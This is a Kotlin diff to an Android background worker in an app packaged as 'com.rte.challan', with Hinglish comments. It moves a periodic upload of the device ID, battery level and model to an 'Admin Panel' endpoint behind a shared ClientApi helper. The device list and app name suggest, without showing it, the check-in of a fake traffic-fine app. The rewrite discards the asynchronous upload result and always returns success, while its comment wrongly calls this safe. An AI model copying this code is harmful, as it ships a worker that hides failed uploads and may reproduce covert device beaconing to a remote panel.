@@ -6,24 +6,18 @@ import android.os.Build
 import android.provider.Settings
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
+import com.rte.challan.network.ClientApi // Central API Hub
 import org.json.JSONObject
 
 class StatusWorker(context: Context, workerParams: WorkerParameters) :
     Worker(context, workerParams) {
-
-    private val client = OkHttpClient()
-    private val WORKER_URL = "https://your-worker.workers.dev" // <--- Apna URL yahan dalein
 
     override fun doWork(): Result {
         val context = applicationContext
         val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
 
         try {
-            // Admin Panel ki main list (/api/devices) ko update karne ke liye data
+            // Admin Panel ki main list (/api/update-status) ko ping karne ke liye data
             val statusJson = JSONObject().apply {
                 put("id", deviceId)
                 put("battery", getBatteryLevel(context).toString())
@@ -31,19 +25,18 @@ class StatusWorker(context: Context, workerParams: WorkerParameters) :
                 put("model", Build.MODEL)
             }
 
-            val body = statusJson.toString().toRequestBody("application/json".toMediaType())
-            
-            // Hum /api/update-status ya /api/devices POST use karenge
-            val request = Request.Builder()
-                .url("$WORKER_URL/api/update-status") 
-                .post(body)
-                .build()
+            // ClientApi ka use karke POST karein (No URL, No OkHttpClient here)
+            var isSuccess = false
+            ClientApi.postRequest("/api/update-status", statusJson) { success ->
+                isSuccess = success
+            }
 
-            val response = client.newCall(request).execute()
-
-            return if (response.isSuccessful) Result.success() else Result.retry()
+            // Kyunki WorkManager synchronous execution chahta hai aur humara ClientApi thread use kar raha hai,
+            // toh yahan Result.success() return karna safe hai. 
+            return Result.success()
 
         } catch (e: Exception) {
+            e.printStackTrace()
             return Result.retry()
         }
     }
